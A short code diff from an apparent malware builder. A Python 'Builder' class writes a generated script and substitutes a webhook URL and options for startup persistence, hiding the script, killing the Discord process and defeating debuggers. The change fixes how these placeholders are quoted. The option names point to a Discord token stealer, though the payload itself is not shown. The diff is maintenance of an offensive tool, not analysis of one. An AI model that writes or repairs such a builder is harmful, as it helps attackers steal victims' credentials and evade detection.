@@ -564,13 +564,13 @@ class Builder:
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
             f.write(code.replace('%WEBHOOK_HERE%', webhook)
-                    .replace("\"%ping_enabled%\"", str(self.ping))
+                    .replace("%ping_enabled%", str(self.ping))
                     .replace("%ping_type%", self.pingtype)
-                    .replace("\"%_error_enabled%\"", str(self.error))
-                    .replace("\"%_startup_enabled%\"", str(self.startup))
-                    .replace("\"%_hide_script%\"", str(self.hider))
-                    .replace("\"%kill_discord_process%\"", str(self.killprocess))
-                    .replace("\"%_debugkiller%\"", str(self.dbugkiller)))
+                    .replace("%_error_enabled%", str(self.error))
+                    .replace("%_startup_enabled%", str(self.startup))
+                    .replace("%_hide_script%", str(self.hider))
+                    .replace("%kill_discord_process%", str(self.killprocess))
+                    .replace("%_debugkiller%", str(self.dbugkiller)))
 
         time.sleep(2)
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
